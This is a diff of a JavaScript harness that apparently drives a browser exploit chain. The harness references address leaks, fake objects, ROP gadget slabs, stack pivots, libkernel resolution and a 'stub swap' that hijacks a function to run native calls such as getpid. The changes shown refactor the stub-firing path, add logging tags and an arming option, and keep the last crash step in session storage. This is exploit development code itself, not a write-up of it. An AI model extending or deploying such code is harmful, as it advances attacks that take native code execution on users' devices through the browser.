@@ -73,7 +73,7 @@ import {
 import { probeLibkernelViaVtable } from "./vtable_lk_probe.js";
 import { createCrashLog } from "./log_persist.js";
 import { fireCoreGetpid, fireCoreNotify, bisectCoreTriggerLite } from "./core_native.js?v=core-6";
-import { fireStubSwapParseInt, fireCollatorStub, pinCollatorStub, verifyStubSwapArm } from "./stub_call.js?v=stub-1";
+import { fireStubSwapParseInt, fireCollatorStub, pinCollatorStub, STUB_LAST_STEP_KEY } from "./stub_call.js?v=stub-3";
 import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall, fireUsleep, fireNotify, firePivotSmoke,
     resolvePivotBuiltin, firePivotTrigger,
     firePivotGetpid,
@@ -91,7 +91,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, stageNotify, fireNativeCall,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js?v=nc-20250831r";
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250901a";
+const BUILD_ID = "rw-20250901c";
 
 function usePoopsNativePath() {
     return params.get("nativepath") === "poops";
@@ -355,7 +355,7 @@ const crashLog = createCrashLog({
     ssBuild: "wk-rw-log-build",
     buildId: BUILD_ID,
     maxLines: 200,
-    critical: /^(FAIL|ERROR|OOM|GIVE-UP|PRIMITIVE|NATIVE|BISECT|SMOKE|PREP-PIN|LK-|PASS|WARN|BOOT|LOG-CLEAR|ATTEMPT|READ-PRIMITIVE|TRIM|HINT|NOTIFY-)/,
+    critical: /^(FAIL|ERROR|OOM|GIVE-UP|PRIMITIVE|NATIVE|BISECT|SMOKE|PREP-PIN|LK-|PASS|WARN|BOOT|LOG-CLEAR|ATTEMPT|READ-PRIMITIVE|TRIM|HINT|NOTIFY-|STUB-)/,
 });
 const CORE_LOG = /ADDROF|FAIL|ERROR|PRIMITIVE|PASS|GIVE-UP|ATTEMPT|SETUP|CARRIER|PAIR|SSV-|TRIM-DEBRIS|ADDROF-RELEASE|FAKE-ADDRESS|READ-PRIMITIVE|PLACEMENT|COMPOSITION|NORMAL-CLONE|ZERO-HEADER|VALIDATION|LOAD-THREW|NO-RESULT|PRIMITIVE-OK|AUTO-RETRY|CORE-GIVE-UP|HINT-GROOM/i;
 
@@ -425,7 +425,7 @@ function mark(tag, detail) {
         return;
     }
     if (nativeQuiet) {
-        if (/^NATIVE-|^NOTIFY-|^PIVOT-|^BASES|^STUBS|^ERROR|^HINT|^BISECT|^SMOKE|^PREP-PIN/.test(tag)) {
+        if (/^NATIVE-|^NOTIFY-|^PIVOT-|^BASES|^STUBS|^STUB-|^ERROR|^HINT|^BISECT|^SMOKE|^PREP-PIN/.test(tag)) {
             lines.push(line);
             if (lines.length > 48) lines.splice(0, lines.length - 48);
             crashLog.append(line, tag);
@@ -5494,44 +5494,52 @@ function runFireGetpid() {
     if (useStubNativePath()) {
         busy = true;
         nativeQuiet = true;
-        mark("STUB-FIRE", "direct m_function stub-swap — NO ROP slab build=" + BUILD_ID);
-        renderOut();
+        const stubLog = function (t, d) {
+            const line = t + (d == null || d === "" ? "" : "  " + d);
+            lines.push(line);
+            if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
+            crashLog.append(line, t);
+            renderOut();
+        };
+        const stubFlush = function () {
+            try { crashLog.flushSync(); } catch (_) { }
+            renderOut();
+        };
+        const stubOpts = {
+            carrier: window._wkCarrier,
+            stubKind: params.get("stubkind") || "all",
+            log: stubLog,
+            flush: stubFlush,
+        };
+        mark("STUB-FIRE", "direct stub — NO ROP slab build=" + BUILD_ID);
+        stubFlush();
         try {
-            const stubKind = params.get("stubkind") || "stub20";
             if (params.get("stubmode") === "collator") {
                 if (!window._stubCollatorPin)
                     window._stubCollatorPin = pinCollatorStub(retained);
-                const r = fireCollatorStub(p, window._stubCollatorPin, lk, off, { stubKind });
+                const r = fireCollatorStub(p, window._stubCollatorPin, lk, off, stubOpts);
                 mark("STUB-OK", r.path + " result=" + r.result + " stub=" + r.stubTag);
                 state("collator stub fired", "ok");
-            } else if (params.get("stubmode") === "arm") {
-                const v = verifyStubSwapArm(p, off, lk, { stubKind });
-                mark(v.ok ? "STUB-ARM-OK" : "STUB-ARM-FAIL", "mainMf=" + v.mainMf + " got=" + v.got);
-                state(v.ok ? "stub arm OK" : "stub arm fail", v.ok ? "ok" : "bad");
+            } else if (params.get("stubmode") === "arm" || params.get("stubarm") === "1") {
+                const r = fireStubSwapParseInt(p, off, lk, Object.assign({}, stubOpts, { armOnly: true }));
+                mark("STUB-ARM-OK", r.stubTag + " mainMf=" + r.mainMf);
+                state("stub arm OK", "ok");
             } else {
-                const r = fireStubSwapParseInt(p, off, lk, {
-                    carrier: window._wkCarrier,
-                    stubKind,
-                });
-                mark("STUB-OK", r.path + " " + r.stubTag + " jsResult=" + r.result
-                    + " arg=" + r.fireArg);
-                const pid = (typeof r.result === "number" && r.result > 0 && r.result < 1000000)
-                    ? r.result : -1;
-                if (pid > 0) {
-                    mark("NATIVE-OK", "stub getpid=" + pid + " build=" + BUILD_ID);
-                    state("stub getpid " + pid, "ok");
-                } else {
-                    mark("STUB-HINT", "tab survived — jsResult may not be pid; try index_stub.html bisect");
-                    state("stub survived", "warn");
-                }
+                const r = fireStubSwapParseInt(p, off, lk, stubOpts);
+                mark("STUB-OK", r.stubTag + " jsResult=" + r.result + " arg=" + r.fireArg);
+                state("stub survived js=" + r.result, "ok");
             }
         } catch (err) {
             mark("STUB-FAIL", (err.message || String(err)) + " build=" + BUILD_ID);
-            state("stub failed", "bad");
+            try {
+                const last = sessionStorage.getItem(STUB_LAST_STEP_KEY);
+                if (last) mark("STUB-LAST-STEP", last);
+            } catch (_) { }
+            state("stub failed — reload for LAST-CRASH-STEP", "bad");
         } finally {
             busy = false;
             nativeQuiet = false;
-            renderOut();
+            stubFlush();
         }
         return;
     }
@@ -5976,6 +5984,7 @@ const NATIVE_OPTION_PRESETS = {
         freshprep: false,
         nativeprep: false,
         pivot: "ta",
+        stubarm: "1",
     },
 };
 
@@ -6057,6 +6066,9 @@ function applyNativeOptionsReload() {
 
     if (prof && prof.pivot) u.searchParams.set("pivot", prof.pivot);
     else if (path === "core") u.searchParams.set("pivot", "ta");
+
+    if (prof && prof.stubarm) u.searchParams.set("stubarm", "1");
+    else u.searchParams.delete("stubarm");
 
     mark("NATIVE-RELOAD", u.pathname + "?" + u.searchParams.toString());
     renderOut();
@@ -6286,6 +6298,11 @@ function init() {
     if (params.get("clearlog") === "1") clearPersistedLog();
     else crashLog.restoreInto(lines);
 
+    try {
+        const stubLast = sessionStorage.getItem(STUB_LAST_STEP_KEY);
+        if (stubLast) mark("STUB-LAST-STEP", stubLast);
+    } catch (_) { }
+
     crashLog.startAutoFlush();
     mark("BOOT", "build=" + BUILD_ID + " — Start → 2e Leak+lk → Accept fn → Fire");
     const np = params.get("notifysmoke");
@@ -6299,6 +6316,8 @@ function init() {
             + (params.get("notifydirect") === "1" ? " direct=1" : ""));
     mark("BOOT", "LK-PROBE line shows dynamic parse status");
     mark("BOOT", groomBootLine(params));
+    if (useStubNativePath())
+        mark("BOOT", "stub path — Fire logs STUB-*; arm first (?stubarm=1); reload shows STUB-LAST-STEP");
     replayHuntTrace();
     window.addEventListener("beforeunload", function () {
         stopPivotScanQuiet();
